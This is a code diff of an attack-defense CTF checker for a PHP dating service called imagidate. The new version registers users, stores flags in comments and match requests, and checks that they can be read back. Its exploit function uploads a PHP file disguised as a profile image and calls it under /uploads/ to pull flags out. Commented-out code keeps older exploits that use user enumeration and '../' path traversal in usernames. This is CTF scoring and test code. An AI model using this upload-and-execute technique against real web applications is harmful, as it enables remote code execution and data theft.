@@ -3,10 +3,14 @@ import asyncio
 import random
 import string
 import faker
+import secrets
+import re
+from hashlib import md5
 
 
 from typing import Optional
 from logging import LoggerAdapter
+from httpx import AsyncClient, Response
 
 from enochecker3 import (
     ChainDB,
@@ -32,357 +36,415 @@ Checker config
 """
 
 SERVICE_PORT = 8080
-checker = Enochecker("ImagiDate", SERVICE_PORT)
+checker = Enochecker("imagidate", SERVICE_PORT)
 app = lambda: checker.app
 
 
 """
 Utility functions
 """
-
-class Connection:
-    def __init__(self, socket: AsyncSocket, logger: LoggerAdapter):
-        self.reader, self.writer = socket[0], socket[1]
-        self.logger = logger
-
-    async def register_user(self, username: str, password: str):
-        self.logger.debug(
-            f"Sending command to register user: {username} with password: {password}"
-        )
-        self.writer.write(f"reg {username} {password}\n".encode())
-        await self.writer.drain()
-        data = await self.reader.readuntil(b">")
-        if not b"User successfully registered" in data:
-            raise MumbleException("Failed to register user")
-
-    async def login_user(self, username: str, password: str):
-        self.logger.debug(f"Sending command to login.")
-        self.writer.write(f"log {username} {password}\n".encode())
-        await self.writer.drain()
-
-        data = await self.reader.readuntil(b">")
-        if not b"Successfully logged in!" in data:
-            raise MumbleException("Failed to log in!")
-
-
-@checker.register_dependency
-def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
-    return Connection(socket, logger)
-
+def assert_response(
+        logger: LoggerAdapter,
+        res : Response,
+        matching_text: str,
+        errmsg: Optional[str] = None
+) -> None:
+    if not matching_text in res.text:
+        logger.error("Failed"
+                     + f"Info: {res.text}")
+        if errmsg is None:
+            errmsg = f"{res.request.method} {res.request.url.path} failed with {res.text}"
+        raise MumbleException(errmsg)
 
 """
 CHECKER FUNCTIONS
 """
 
 @checker.putflag(0)
-async def putflag_note(
+async def putflag_db(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
-    conn: Connection,
+    client: AsyncClient,
     logger: LoggerAdapter,    
 ) -> None:
-    # First we need to register a user. So let's create some random strings. (Your real checker should use some funny usernames or so)
-    username: str = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password: str = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-
-    # Log a message before any critical action that could raise an error.
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # Register a new user
-    await conn.register_user(username, password)
-
-    # Now we need to login
-    await conn.login_user(username, password)
-
-    # Finally, we can post our note!
-    logger.debug(f"Sending command to set the flag")
-    conn.writer.write(f"set {task.flag}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
-    try:
-        # Try to retrieve the resulting noteId. Using rstrip() is hacky, you should probably want to use regular expressions or something more robust.
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
-
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-
-    logger.debug(f"Got noteId {noteId}")
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
     
-    # Save the generated values for the associated getflag() call.
-    await db.set("userdata", (username, password, noteId))
+    # reguster and login
+    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    age = random.randint(20,45)
+    gender = secrets.choice(["Male", "Female", "Other"])
 
-    return username
+    data = {
+        "username" : username,
+        "password" : password,
+        "confirm_password" : password,
+        "age" : age,
+        "gender" : gender
+    }
+    register_res = await client.post("/register.php", data=data)
+    assert_response(logger,register_res,"Registration successful")
+
+    data = {
+        "username" : username,
+        "password" : password,
+    }
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
+    
+    # find user_id
+    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
+    user_id = id_match.group(1)
+
+    # deploy flag
+    flag = task.flag
+    data = {
+        "comment_text" : flag
+    }
+    putflag_res = await client.post(f"/profile.php?id={user_id}", data=data)
+    assert_response(logger, putflag_res, "Comment added successfully")
+
+    await db.set("userdata", (username, password, user_id))
+    
+    return f"User: {username} ID: {user_id}"
 
 @checker.getflag(0)
-async def getflag_note(
-    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
+async def getflag_db(
+    task: GetflagCheckerTaskMessage,
+    db: ChainDB,
+    client: AsyncClient,
+    logger: LoggerAdapter,
 ) -> None:
+    
     try:
-        username, password, noteId = await db.get("userdata")
+        username, password, user_Id = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-    logger.debug(f"Connecting to the service")
-    await conn.reader.readuntil(b">")
+    data = {"username": username, "password": password}
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
 
-    # Let's login to the service
-    await conn.login_user(username, password)
+    profile_res = await client.get(f"/profile.php?id={user_Id}")
+    assert_in(task.flag, profile_res.text, "FLAG NOT FOUND")
 
-    # Let´s obtain our note.
-    logger.debug(f"Sending command to retrieve note: {noteId}")
-    conn.writer.write(f"get {noteId}\n".encode())
-    await conn.writer.drain()
-    note = await conn.reader.readuntil(b">")
-    assert_in(
-        task.flag.encode(), note, "Resulting flag was found to be incorrect"
-    )
+@checker.putflag(1)
+async def putflag_api(
+    task: PutflagCheckerTaskMessage,
+    db: ChainDB,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+):
+    
+    # reguster and login
+    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    age = random.randint(20,45)
+    gender = secrets.choice(["Male", "Female", "Other"])
 
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-        
+    data = {
+        "username" : username,
+        "password" : password,
+        "confirm_password" : password,
+        "age" : age,
+        "gender" : gender
+    }
+    register_res = await client.post("/register.php", data=data)
+    assert_response(logger,register_res,"Registration successful")
 
-@checker.putnoise(0)
-async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to the service")
-    welcome = await conn.reader.readuntil(b">")
+    data = {
+        "username" : username,
+        "password" : password,
+    }
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
 
-    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    randomNote = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=36)
-    )
+    # find user_id
+    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
+    user_id = id_match.group(1)
 
-    # Register another user
-    await conn.register_user(username, password)
+    # deploy flag
+    data = {
+        "username" : username,
+        "age" : age,
+        "gender" : gender,
+        "requested_username" : secrets.choice(["habibi", "habibti"]),
+        "punchline" : task.flag
+    }
+    match_res = await client.post("/match.php", data=data)
+    assert_response(logger, match_res, "Data sent succesfully")
 
-    # Now we need to login
-    await conn.login_user(username, password)
+    await db.set("userdata", (username, password, user_id))
+    
+    return f"User: {username} ID: {user_id}"    
 
-    # Finally, we can post our note!
-    logger.debug(f"Sending command to save a note")
-    conn.writer.write(f"set {randomNote}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
+@checker.getflag(1)
+async def getflag_api(
+    task: GetflagCheckerTaskMessage,
+    db: ChainDB,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+):
+    
     try:
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
+        username, password, user_Id = await db.get("userdata")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
 
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
+    data = {"username": username, "password": password}
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
 
-    logger.debug(f"{noteId}")
+    data = {
+        "username" : username
+    }
+    profile_res = await client.post(f"/check_response.php", data=data)
+    output = profile_res.content.replace(b"\\\\", b"\\").decode("unicode-escape")
+    assert_in(task.flag, output, "FLAG NOT FOUND")
 
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-
-    await db.set("userdata", (username, password, noteId, randomNote))
-        
-@checker.getnoise(0)
-async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-    try:
-        (username, password, noteId, randomNote) = await db.get('userdata')
-    except:
-        raise MumbleException("Putnoise Failed!") 
-
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # Let's login to the service
-    await conn.login_user(username, password)
-
-    # Let´s obtain our note.
-    logger.debug(f"Sending command to retrieve note: {noteId}")
-    conn.writer.write(f"get {noteId}\n".encode())
-    await conn.writer.drain()
-    data = await conn.reader.readuntil(b">")
-    if not randomNote.encode() in data:
-        raise MumbleException("Resulting flag was found to be incorrect")
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-
-
-@checker.havoc(0)
-async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # In variant 0, we'll check if the help text is available
-    logger.debug(f"Sending help command")
-    conn.writer.write(f"help\n".encode())
-    await conn.writer.drain()
-    helpstr = await conn.reader.readuntil(b">")
-
-    for line in [
-        "This is a notebook service. Commands:",
-        "reg USER PW - Register new account",
-        "log USER PW - Login to account",
-        "set TEXT..... - Set a note",
-        "user  - List all users",
-        "list - List all notes",
-        "exit - Exit!",
-        "dump - Dump the database",
-        "get ID",
-    ]:
-        assert_in(line.encode(), helpstr, "Received incomplete response.")
-
-@checker.havoc(1)
-async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # In variant 1, we'll check if the `user` command still works.
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-
-    # Register and login a dummy user
-    await conn.register_user(username, password)
-    await conn.login_user(username, password)
-
-    logger.debug(f"Sending user command")
-    conn.writer.write(f"user\n".encode())
-    await conn.writer.drain()
-    ret = await conn.reader.readuntil(b">")
-    if not b"User 0: " in ret:
-        raise MumbleException("User command does not return any users")
-
-    if username:
-        assert_in(username.encode(), ret, "Flag username not in user output")
-
-    # conn.writer.close()
-    # await conn.writer.wait_closed()
-
-@checker.havoc(2)
-async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # In variant 2, we'll check if the `list` command still works.
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    randomNote = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=36)
-    )
-
-    # Register and login a dummy user
-    await conn.register_user(username, password)
-    await conn.login_user(username, password)
-
-    logger.debug(f"Sending command to save a note")
-    conn.writer.write(f"set {randomNote}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
-    try:
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
-
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-
-    logger.debug(f"{noteId}")
-
-    logger.debug(f"Sending list command")
-    conn.writer.write(f"list\n".encode())
-    await conn.writer.drain()
-
-    data = await conn.reader.readuntil(b">")
-    if not noteId.encode() in data:
-        raise MumbleException("List command does not work as intended")
-
+#@checker.putnoise(0)
+#async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
+#    logger.debug(f"Connecting to the service")
+#    welcome = await conn.reader.readuntil(b">")
+#
+#    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
+#    username = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=12)
+#    )
+#    password = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=12)
+#    )
+#    randomNote = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=36)
+#    )
+#
+#    # Register another user
+#    await conn.register_user(username, password)
+#
+#    # Now we need to login
+#    await conn.login_user(username, password)
+#
+#    # Finally, we can post our note!
+#    logger.debug(f"Sending command to save a note")
+#    conn.writer.write(f"set {randomNote}\n".encode())
+#    await conn.writer.drain()
+#    await conn.reader.readuntil(b"Note saved! ID is ")
+#
+#    try:
+#        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
+#    except Exception as ex:
+#        logger.debug(f"Failed to retrieve note: {ex}")
+#        raise MumbleException("Could not retrieve NoteId")
+#
+#    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
+#
+#    logger.debug(f"{noteId}")
+#
+#    # Exit!
+#    logger.debug(f"Sending exit command")
+#    conn.writer.write(f"exit\n".encode())
+#    await conn.writer.drain()
+#
+#    await db.set("userdata", (username, password, noteId, randomNote))
+#        
+#@checker.getnoise(0)
+#async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
+#    try:
+#        (username, password, noteId, randomNote) = await db.get('userdata')
+#    except:
+#        raise MumbleException("Putnoise Failed!") 
+#
+#    logger.debug(f"Connecting to service")
+#    welcome = await conn.reader.readuntil(b">")
+#
+#    # Let's login to the service
+#    await conn.login_user(username, password)
+#
+#    # Let´s obtain our note.
+#    logger.debug(f"Sending command to retrieve note: {noteId}")
+#    conn.writer.write(f"get {noteId}\n".encode())
+#    await conn.writer.drain()
+#    data = await conn.reader.readuntil(b">")
+#    if not randomNote.encode() in data:
+#        raise MumbleException("Resulting flag was found to be incorrect")
+#
+#    # Exit!
+#    logger.debug(f"Sending exit command")
+#    conn.writer.write(f"exit\n".encode())
+#    await conn.writer.drain()
+#
+#
+#@checker.havoc(0)
+#async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
+#    logger.debug(f"Connecting to service")
+#    welcome = await conn.reader.readuntil(b">")
+#
+#    # In variant 0, we'll check if the help text is available
+#    logger.debug(f"Sending help command")
+#    conn.writer.write(f"help\n".encode())
+#    await conn.writer.drain()
+#    helpstr = await conn.reader.readuntil(b">")
+#
+#    for line in [
+#        "This is a notebook service. Commands:",
+#        "reg USER PW - Register new account",
+#        "log USER PW - Login to account",
+#        "set TEXT..... - Set a note",
+#        "user  - List all users",
+#        "list - List all notes",
+#        "exit - Exit!",
+#        "dump - Dump the database",
+#        "get ID",
+#    ]:
+#        assert_in(line.encode(), helpstr, "Received incomplete response.")
+#
+#@checker.havoc(1)
+#async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
+#    logger.debug(f"Connecting to service")
+#    welcome = await conn.reader.readuntil(b">")
+#
+#    # In variant 1, we'll check if the `user` command still works.
+#    username = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=12)
+#    )
+#    password = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=12)
+#    )
+#
+#    # Register and login a dummy user
+#    await conn.register_user(username, password)
+#    await conn.login_user(username, password)
+#
+#    logger.debug(f"Sending user command")
+#    conn.writer.write(f"user\n".encode())
+#    await conn.writer.drain()
+#    ret = await conn.reader.readuntil(b">")
+#    if not b"User 0: " in ret:
+#        raise MumbleException("User command does not return any users")
+#
+#    if username:
+#        assert_in(username.encode(), ret, "Flag username not in user output")
+#
+#    # conn.writer.close()
+#    # await conn.writer.wait_closed()
+#
+#@checker.havoc(2)
+#async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
+#    logger.debug(f"Connecting to service")
+#    welcome = await conn.reader.readuntil(b">")
+#
+#    # In variant 2, we'll check if the `list` command still works.
+#    username = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=12)
+#    )
+#    password = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=12)
+#    )
+#    randomNote = "".join(
+#        random.choices(string.ascii_uppercase + string.digits, k=36)
+#    )
+#
+#    # Register and login a dummy user
+#    await conn.register_user(username, password)
+#    await conn.login_user(username, password)
+#
+#    logger.debug(f"Sending command to save a note")
+#    conn.writer.write(f"set {randomNote}\n".encode())
+#    await conn.writer.drain()
+#    await conn.reader.readuntil(b"Note saved! ID is ")
+#
+#    try:
+#        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
+#    except Exception as ex:
+#        logger.debug(f"Failed to retrieve note: {ex}")
+#        raise MumbleException("Could not retrieve NoteId")
+#
+#    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
+#
+#    logger.debug(f"{noteId}")
+#
+#    logger.debug(f"Sending list command")
+#    conn.writer.write(f"list\n".encode())
+#    await conn.writer.drain()
+#
+#    data = await conn.reader.readuntil(b">")
+#    if not noteId.encode() in data:
+#        raise MumbleException("List command does not work as intended")
+#
 @checker.exploit(0)
-async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"dump\nexit\n")
-    await conn.writer.drain()
-    data = await conn.reader.read(-1)
-    if flag := searcher.search_flag(data):
-        return flag
+async def exploit_file_upload(task: ExploitCheckerTaskMessage,
+                    searcher: FlagSearcher,
+                    client: AsyncClient,
+                    logger:LoggerAdapter) -> Optional[str]:
+    
+    print(task.attack_info)
+
+    # reguster and login
+    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    age = random.randint(20,45)
+    gender = secrets.choice(["Male", "Female", "Other"])
+
+    data = {
+        "username" : username,
+        "password" : password,
+        "confirm_password" : password,
+        "age" : age,
+        "gender" : gender
+    }
+    register_res = await client.post("/register.php", data=data)
+    assert_response(logger,register_res,"Registration successful")
+
+    data = {
+        "username" : username,
+        "password" : password,
+    }
+    login_res = await client.post("/login.php", data=data, follow_redirects=True)
+    assert_response(logger, login_res, "Profile of")
+    
+    # find user_id
+    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
+    user_id = id_match.group(1)
+
+    # upload exploit
+    file = {"image": open("exp.php", "rb")}
+    upload_res = await client.post("/upload.php", files=file, follow_redirects=True)
+    assert_response(logger, upload_res, "Profile of")
+
+    # trigger exploit
+    hashed_username = md5(username.encode()).hexdigest()
+    exp_res = await client.get(f"/uploads/{hashed_username}/exp.php")
+
+    if flag := searcher.search_flag(exp_res.text):
+            return flag
+
     raise MumbleException("flag not found")
 
-@checker.exploit(1)
-async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
 
-    # TODO: Use flag hints
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
 
-@checker.exploit(2)
-async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
-
-    # TODO: Use flag hints?
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
-
+#@checker.exploit(1)
+#async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
+#    welcome = await conn.reader.readuntil(b">")
+#    conn.writer.write(b"user\n")
+#    await conn.writer.drain()
+#
+#    # TODO: Use flag hints
+#    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
+#    for user in user_list:
+#        user_name = user.split()[-1]
+#        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
+#        await conn.writer.drain()
+#        await conn.reader.readuntil(b">")  # successfully registered
+#        await conn.reader.readuntil(b">")  # successfully logged in
+#        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
+#        for note in notes_list:
+#            note_id = note.split()[-1]
+#            conn.writer.write(b"get %s\n" % note_id)
+#            await conn.writer.drain()
+#            data = await conn.reader.readuntil(b">")
+#            if flag := searcher.search_flag(data):
+#                return flag
+#    raise MumbleException("flag not found")
+#
 
 if __name__ == "__main__":
     checker.run()
